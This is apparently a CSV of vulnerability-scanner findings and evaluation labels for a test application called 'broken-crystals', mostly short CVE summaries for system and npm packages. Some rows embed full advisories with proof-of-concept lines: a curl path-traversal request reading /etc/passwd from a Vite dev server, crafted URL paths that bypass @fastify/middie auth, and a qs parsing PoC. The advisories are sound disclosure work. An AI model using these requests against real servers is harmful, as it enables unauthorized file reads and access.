finding_group_id,tools,target,cwe,severity,location,description,verdict,confidence,ground_truth_match,tool_count
GRP-broken-crystals-CWE-190-253,trivy,broken-crystals,CWE-190,critical,zlib1g@1:1.2.11.dfsg-1+deb10u2,zlib: integer overflow and resultant heap-based buffer overflow in zipOpenNewFileInZip4_6,pending,low,no,1
GRP-broken-crystals-CWE-190-254,trivy,broken-crystals,CWE-190,critical,zlib1g-dev@1:1.2.11.dfsg-1+deb10u2,zlib: integer overflow and resultant heap-based buffer overflow in zipOpenNewFileInZip4_6,pending,low,no,1
GRP-broken-crystals-CWE-191-255,trivy,broken-crystals,CWE-191,medium,linux-libc-dev@4.19.269-1,kernel: nilfs2: fix underflow in second superblock position calculations,pending,low,no,1
GRP-broken-crystals-CWE-193-256,trivy,broken-crystals,CWE-193,medium,libsystemd0@241-7~deb10u9,systemd: buffer overrun in format_timespan() function,pending,low,no,1
GRP-broken-crystals-CWE-193-257,trivy,broken-crystals,CWE-193,medium,libudev1@241-7~deb10u9,systemd: buffer overrun in format_timespan() function,pending,low,no,1
GRP-broken-crystals-CWE-193-258,trivy,broken-crystals,CWE-193,medium,linux-libc-dev@4.19.269-1,"kernel: off-by-one error for an RDS_MSG_RX_DGRAM_TRACE_MAX comparison, resulting in out-of-bounds access",pending,low,no,1
GRP-broken-crystals-CWE-20-259,npm-audit,broken-crystals,CWE-20,high,nodemailer,Nodemailer: Email to an unintended domain can occur due to Interpretation Conflict,pending,low,no,1
GRP-broken-crystals-CWE-20-260,dep-check,broken-crystals,CWE-20,high,@fastify/middie:8.3.3,"## Summary A path normalization inconsistency in `@fastify/middie` can result in authentication/authorization bypass when using path-scoped middleware (for example, `app.use('/secret', auth)`). When Fastify router normalization options are enabled (such as `ignoreDuplicateSlashes`, `useSemicolonDelimiter`, and related trailing-slash behavior), crafted request paths may bypass middleware checks while still being routed to protected handlers. ## Impact An unauthenticated remote attacker can access endpoints intended to be protected by middleware-based auth/authorization controls by sending specially crafted URL paths (for example, `//secret` or `/secret;foo=bar`), depending on router option configuration. This may lead to unauthorized access to protected functionality and data exposure. ## Affected versions - Confirmed affected: `@fastify/middie@9.1.0` - All versions prior to the patch are affected. ## Patched versions - Fixed in: *9.2.0* ## Details The issue is caused by canonicalization drift between: 1. `@fastify/middie` path matching for `app.use('/prefix', ...)`, and 2. Fastify/find-my-way route lookup normalization. Because middleware and router did not always evaluate the same normalized path, auth middleware could be skipped while route resolution still succeeded. ## Workarounds Until patched version is deployed: - Avoid relying solely on path-scoped middie guards for auth/authorization. - Enforce auth at route-level handlers/hooks after router normalization. - Disable risky normalization combinations only if operationally feasible. ## Resources - Fluid Attacks Disclosure Policy: https://fluidattacks.com/advisories/policy - Fluid Attacks advisory URL: https://fluidattacks.com/advisories/jimenez ## Credits - **Cristian Vargas** (Fluid Attacks Research Team) — discovery and report. - **Oscar Uribe** (Fluid Attacks) — coordination and disclosure.",pending,low,no,1
GRP-broken-crystals-CWE-20-261,dep-check,broken-crystals,CWE-20,high,qs:6.10.4,"### Summary The `arrayLimit` option in qs did not enforce limits for bracket notation (`a[]=1&a[]=2`), only for indexed notation (`a[0]=1`). This is a consistency bug; `arrayLimit` should apply uniformly across all array notations. **Note:** The default `parameterLimit` of 1000 effectively mitigates the DoS scenario originally described. With default options, bracket notation cannot produce arrays larger than `parameterLimit` regardless of `arrayLimit`, because each `a[]=value` consumes one parameter slot. The severity has been reduced accordingly. ### Details The `arrayLimit` option only checked limits for indexed notation (`a[0]=1&a[1]=2`) but did not enforce it for bracket notation (`a[]=1&a[]=2`). **Vulnerable code** (`lib/parse.js:159-162`): ```javascript if (root === '[]' && options.parseArrays) { obj = utils.combine([], leaf); // No arrayLimit check } ``` **Working code** (`lib/parse.js:175`): ```javascript else if (index <= options.arrayLimit) { // Limit checked here obj = []; obj[index] = leaf; } ``` The bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays. ### PoC ```javascript const qs = require('qs'); const result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', { arrayLimit: 5 }); console.log(result.a.length); // Output: 6 (should be max 5) ``` **Note on parameterLimit interaction:** The original advisory's ""DoS demonstration"" claimed a length of 10,000, but `parameterLimit` (default: 1000) caps parsing to 1,000 parameters. With default options, the actual output is 1,000, not 10,000. ### Impact Consistency bug in `arrayLimit` enforcement. With default `parameterLimit`, the practical DoS risk is negligible since `parameterLimit` already caps the total number of parsed parameters (and thus array elements from bracket notation). The risk increases only when `parameterLimit` is explicitly set to a very high value.",pending,low,no,1
GRP-broken-crystals-CWE-20-262,trivy,broken-crystals,CWE-20,low,coreutils@8.30-3,coreutils: Non-privileged session can escape to the parent session in chroot,pending,low,no,1
GRP-broken-crystals-CWE-20-263,trivy,broken-crystals,CWE-20,medium,imagemagick@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-264,trivy,broken-crystals,CWE-20,medium,imagemagick-6-common@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-265,trivy,broken-crystals,CWE-20,medium,imagemagick-6.q16@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-266,trivy,broken-crystals,CWE-20,high,libidn2-0@2.0.5-1+deb10u1,GNU libidn2 before 2.2.0 fails to perform the roundtrip checks specifi ...,pending,low,no,1
GRP-broken-crystals-CWE-20-267,trivy,broken-crystals,CWE-20,high,libidn2-dev@2.0.5-1+deb10u1,GNU libidn2 before 2.2.0 fails to perform the roundtrip checks specifi ...,pending,low,no,1
GRP-broken-crystals-CWE-20-268,trivy,broken-crystals,CWE-20,medium,libmagickcore-6-arch-config@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-269,trivy,broken-crystals,CWE-20,medium,libmagickcore-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-270,trivy,broken-crystals,CWE-20,medium,libmagickcore-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-271,trivy,broken-crystals,CWE-20,medium,libmagickcore-6.q16-6-extra@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-272,trivy,broken-crystals,CWE-20,medium,libmagickcore-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-273,trivy,broken-crystals,CWE-20,medium,libmagickcore-dev@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-274,trivy,broken-crystals,CWE-20,medium,libmagickwand-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-275,trivy,broken-crystals,CWE-20,medium,libmagickwand-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-276,trivy,broken-crystals,CWE-20,medium,libmagickwand-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-277,trivy,broken-crystals,CWE-20,medium,libmagickwand-dev@8:6.9.10.23+dfsg-2.1+deb10u4,"ImageMagick: Specially crafted SVG leads to segmentation fault and generate trash files in ""/tmp"", possible to leverage DoS",pending,low,no,1
GRP-broken-crystals-CWE-20-278,trivy,broken-crystals,CWE-20,high,libpq-dev@11.19-0+deb10u1,postgresql: schema_element defeats protective search_path changes,pending,low,no,1
GRP-broken-crystals-CWE-20-279,trivy,broken-crystals,CWE-20,high,libpq5@11.19-0+deb10u1,postgresql: schema_element defeats protective search_path changes,pending,low,no,1
GRP-broken-crystals-CWE-20-280,trivy,broken-crystals,CWE-20,high,libpython2.7-minimal@2.7.16-2+deb10u1,python: urllib.parse url blocklisting bypass,pending,low,no,1
GRP-broken-crystals-CWE-20-281,trivy,broken-crystals,CWE-20,high,libpython2.7-stdlib@2.7.16-2+deb10u1,python: urllib.parse url blocklisting bypass,pending,low,no,1
GRP-broken-crystals-CWE-20-282,trivy,broken-crystals,CWE-20,high,libpython3.7-minimal@3.7.3-2+deb10u4,python: urllib.parse url blocklisting bypass,pending,low,no,1
GRP-broken-crystals-CWE-20-283,trivy,broken-crystals,CWE-20,high,libpython3.7-stdlib@3.7.3-2+deb10u4,python: urllib.parse url blocklisting bypass,pending,low,no,1
GRP-broken-crystals-CWE-20-284,trivy,broken-crystals,CWE-20,medium,linux-libc-dev@4.19.269-1,kernel: Improper input validation in some Intel(R) Graphics Drivers,pending,low,no,1
GRP-broken-crystals-CWE-20-285,trivy,broken-crystals,CWE-20,high,python2.7@2.7.16-2+deb10u1,python: urllib.parse url blocklisting bypass,pending,low,no,1
GRP-broken-crystals-CWE-20-286,trivy,broken-crystals,CWE-20,high,python2.7-minimal@2.7.16-2+deb10u1,python: urllib.parse url blocklisting bypass,pending,low,no,1
GRP-broken-crystals-CWE-20-287,trivy,broken-crystals,CWE-20,high,python3.7@3.7.3-2+deb10u4,python: urllib.parse url blocklisting bypass,pending,low,no,1
GRP-broken-crystals-CWE-20-288,trivy,broken-crystals,CWE-20,high,python3.7-minimal@3.7.3-2+deb10u4,python: urllib.parse url blocklisting bypass,pending,low,no,1
GRP-broken-crystals-CWE-20-289,trivy,broken-crystals,CWE-20,high,@fastify/middie@8.1.0,@fastify/middie has Improper Path Normalization when Using Path-Scoped Middleware,pending,low,no,1
GRP-broken-crystals-CWE-20-290,trivy,broken-crystals,CWE-20,medium,follow-redirects@1.15.2,follow-redirects: Improper Input Validation due to the improper handling of URLs by the url.parse(),pending,low,no,1
GRP-broken-crystals-CWE-20-291,trivy,broken-crystals,CWE-20,high,libxmljs@0.19.7,Denial of service vulnerability exists in libxmljs,pending,low,no,1
GRP-broken-crystals-CWE-20-292,trivy,broken-crystals,CWE-20,high,qs@6.5.3,qs: qs: Denial of Service via improper input validation in array parsing,pending,low,no,1
GRP-broken-crystals-CWE-200-293,dep-check,broken-crystals,CWE-200,info,vite:5.4.10,"### Summary The contents of arbitrary files can be returned to the browser if the dev server is running on Node or Bun. ### Impact Only apps with the following conditions are affected. - explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) - running the Vite dev server on runtimes that are not Deno (e.g. Node, Bun) ### Details [HTTP 1.1 spec (RFC 9112) does not allow `#` in `request-target`](https://datatracker.ietf.org/doc/html/rfc9112#section-3.2). Although an attacker can send such a request. For those requests with an invalid `request-line` (it includes `request-target`), the spec [recommends to reject them with 400 or 301](https://datatracker.ietf.org/doc/html/rfc9112#section-3.2-4). The same can be said for HTTP 2 ([ref1](https://datatracker.ietf.org/doc/html/rfc9113#section-8.3.1-2.4.1), [ref2](https://datatracker.ietf.org/doc/html/rfc9113#section-8.3.1-3), [ref3](https://datatracker.ietf.org/doc/html/rfc9113#section-8.1.1-3)). On Node and Bun, those requests are not rejected internally and is passed to the user land. For those requests, the value of [`http.IncomingMessage.url`](https://nodejs.org/docs/latest-v22.x/api/http.html#messageurl) contains `#`. Vite assumed `req.url` won't contain `#` when checking `server.fs.deny`, allowing those kinds of requests to bypass the check. On Deno, those requests are not rejected internally and is passed to the user land as well. But for those requests, the value of `http.IncomingMessage.url` did not contain `#`. ### PoC ``` npm create vite@latest cd vite-project/ npm install npm run dev ``` send request to read `/etc/passwd` ``` curl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173 ```",TP,medium,yes,1
GRP-broken-crystals-CWE-200-294,trivy,broken-crystals,CWE-200,low,curl@7.64.0-4+deb10u5,curl: more POST-after-PUT confusion,TP,medium,yes,1
GRP-broken-crystals-CWE-200-295,trivy,broken-crystals,CWE-200,high,imagemagick@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-296,trivy,broken-crystals,CWE-200,high,imagemagick-6-common@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-297,trivy,broken-crystals,CWE-200,high,imagemagick-6.q16@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-298,trivy,broken-crystals,CWE-200,low,libcurl3-gnutls@7.64.0-4+deb10u5,curl: more POST-after-PUT confusion,TP,medium,yes,1
GRP-broken-crystals-CWE-200-299,trivy,broken-crystals,CWE-200,low,libcurl4@7.64.0-4+deb10u5,curl: more POST-after-PUT confusion,TP,medium,yes,1
GRP-broken-crystals-CWE-200-300,trivy,broken-crystals,CWE-200,low,libcurl4-openssl-dev@7.64.0-4+deb10u5,curl: more POST-after-PUT confusion,TP,medium,yes,1
GRP-broken-crystals-CWE-200-301,trivy,broken-crystals,CWE-200,high,libmagickcore-6-arch-config@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-302,trivy,broken-crystals,CWE-200,high,libmagickcore-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-303,trivy,broken-crystals,CWE-200,high,libmagickcore-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-304,trivy,broken-crystals,CWE-200,high,libmagickcore-6.q16-6-extra@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-305,trivy,broken-crystals,CWE-200,high,libmagickcore-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-306,trivy,broken-crystals,CWE-200,high,libmagickcore-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-307,trivy,broken-crystals,CWE-200,high,libmagickwand-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-308,trivy,broken-crystals,CWE-200,high,libmagickwand-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-309,trivy,broken-crystals,CWE-200,high,libmagickwand-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-310,trivy,broken-crystals,CWE-200,high,libmagickwand-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Cipher leak when the calculating signatures in TransformSignatureof MagickCore/signature.c,TP,medium,yes,1
GRP-broken-crystals-CWE-200-311,trivy,broken-crystals,CWE-200,medium,libpython3.7-minimal@3.7.3-2+deb10u4,python: Information disclosure via pydoc,TP,medium,yes,1
GRP-broken-crystals-CWE-200-312,trivy,broken-crystals,CWE-200,medium,libpython3.7-stdlib@3.7.3-2+deb10u4,python: Information disclosure via pydoc,TP,medium,yes,1
GRP-broken-crystals-CWE-200-313,trivy,broken-crystals,CWE-200,medium,libsystemd0@241-7~deb10u9,systemd: local information leak due to systemd-coredump not respecting fs.suid_dumpable kernel setting,TP,medium,yes,1
GRP-broken-crystals-CWE-200-314,trivy,broken-crystals,CWE-200,medium,libudev1@241-7~deb10u9,systemd: local information leak due to systemd-coredump not respecting fs.suid_dumpable kernel setting,TP,medium,yes,1
GRP-broken-crystals-CWE-200-315,trivy,broken-crystals,CWE-200,medium,linux-libc-dev@4.19.269-1,kernel: Information disclosure in vhost/vhost.c:vhost_new_msg(),TP,medium,yes,1
GRP-broken-crystals-CWE-200-316,trivy,broken-crystals,CWE-200,medium,python3.7@3.7.3-2+deb10u4,python: Information disclosure via pydoc,TP,medium,yes,1
GRP-broken-crystals-CWE-200-317,trivy,broken-crystals,CWE-200,medium,python3.7-minimal@3.7.3-2+deb10u4,python: Information disclosure via pydoc,TP,medium,yes,1
GRP-broken-crystals-CWE-200-318,trivy,broken-crystals,CWE-200,medium,follow-redirects@1.15.2,follow-redirects: Possible credential leak,TP,medium,yes,1
GRP-broken-crystals-CWE-200-319,trivy,broken-crystals,CWE-200,low,undici@5.21.0,node-undici: cookie leakage,TP,medium,yes,1
GRP-broken-crystals-CWE-203-320,trivy,broken-crystals,CWE-203,high,libgcrypt20@1.8.4-5+deb10u1,libgcrypt: mishandles ElGamal encryption because it lacks exponent blinding to address a side-channel attack against mpi_powm,pending,low,no,1
GRP-broken-crystals-CWE-203-321,trivy,broken-crystals,CWE-203,medium,linux-libc-dev@4.19.269-1,amd: Return Address Predictor vulnerability leading to information disclosure,pending,low,no,1
GRP-broken-crystals-CWE-208-322,trivy,broken-crystals,CWE-208,medium,libgnutls-dane0@3.6.7-4+deb10u10,gnutls: timing side-channel in the RSA-PSK authentication,pending,low,no,1
GRP-broken-crystals-CWE-208-323,trivy,broken-crystals,CWE-208,medium,libgnutls-openssl27@3.6.7-4+deb10u10,gnutls: timing side-channel in the RSA-PSK authentication,pending,low,no,1
GRP-broken-crystals-CWE-208-324,trivy,broken-crystals,CWE-208,medium,libgnutls28-dev@3.6.7-4+deb10u10,gnutls: timing side-channel in the RSA-PSK authentication,pending,low,no,1
GRP-broken-crystals-CWE-208-325,trivy,broken-crystals,CWE-208,medium,libgnutls30@3.6.7-4+deb10u10,gnutls: timing side-channel in the RSA-PSK authentication,pending,low,no,1
GRP-broken-crystals-CWE-208-326,trivy,broken-crystals,CWE-208,medium,libgnutlsxx28@3.6.7-4+deb10u10,gnutls: timing side-channel in the RSA-PSK authentication,pending,low,no,1
GRP-broken-crystals-CWE-208-327,bearer,broken-crystals,CWE-208,info,src/auth/csrf.guard.ts:36,"## Description Observable Timing Discrepancy occurs when the time it takes for certain operations to complete can be measured and observed by attackers. This vulnerability is particularly concerning when operations involve sensitive information, such as password checks or secret comparisons. If attackers can analyze how long these operations take, they might be able to deduce confidential details, putting your data at risk. ## Remediations - **Do** implement algorithms that process sensitive information in constant time. This approach helps prevent attackers from guessing secrets based on the duration of operations. - **Do** use built-in security features and cryptographic libraries that offer functions safe from timing attacks for comparing secret values. - **Do not** use direct string comparisons for sensitive information, as this can lead to early termination of the function if a mismatch is found, revealing timing information. ```javascript if (apiToken === ""zDE9ET!TDq2uZx2oM!FD2"") { // unsafe ... } ``` - **Do not** design application logic that changes execution paths in a manner that could introduce timing discrepancies based on user input or secret values. ## References - [OWASP Guide to Cryptography](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html) - [MDN Web Docs on SubtleCrypto API](https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto)",pending,low,no,1
GRP-broken-crystals-CWE-209-328,trivy,broken-crystals,CWE-209,high,cpp-8@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-329,trivy,broken-crystals,CWE-209,high,g++-8@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-330,trivy,broken-crystals,CWE-209,high,gcc-8@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-331,trivy,broken-crystals,CWE-209,high,gcc-8-base@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-332,trivy,broken-crystals,CWE-209,high,libasan5@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-333,trivy,broken-crystals,CWE-209,high,libatomic1@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-334,trivy,broken-crystals,CWE-209,high,libcc1-0@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-335,trivy,broken-crystals,CWE-209,high,libgcc-8-dev@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-336,trivy,broken-crystals,CWE-209,high,libgcc1@1:8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-337,trivy,broken-crystals,CWE-209,high,libgomp1@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-338,trivy,broken-crystals,CWE-209,high,libitm1@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-339,trivy,broken-crystals,CWE-209,high,liblsan0@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-340,trivy,broken-crystals,CWE-209,high,libmpx2@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-341,trivy,broken-crystals,CWE-209,high,libquadmath0@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-342,trivy,broken-crystals,CWE-209,high,libstdc++-8-dev@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-343,trivy,broken-crystals,CWE-209,high,libstdc++6@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-344,trivy,broken-crystals,CWE-209,high,libtsan0@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-345,trivy,broken-crystals,CWE-209,high,libubsan1@8.3.0-6,gcc: spilling of stack protection address in cfgexpand.c and function.c leads to stack-overflow protection bypass,TP,medium,yes,1
GRP-broken-crystals-CWE-209-346,trivy,broken-crystals,CWE-209,medium,linux-libc-dev@4.19.269-1,hw: amd: Cross-Process Information Leak,TP,medium,yes,1
GRP-broken-crystals-CWE-212-347,trivy,broken-crystals,CWE-212,medium,linux-libc-dev@4.19.269-1,hw: cpu: AMD: RetBleed Arbitrary Speculative Code Execution with Return Instructions,pending,low,no,1
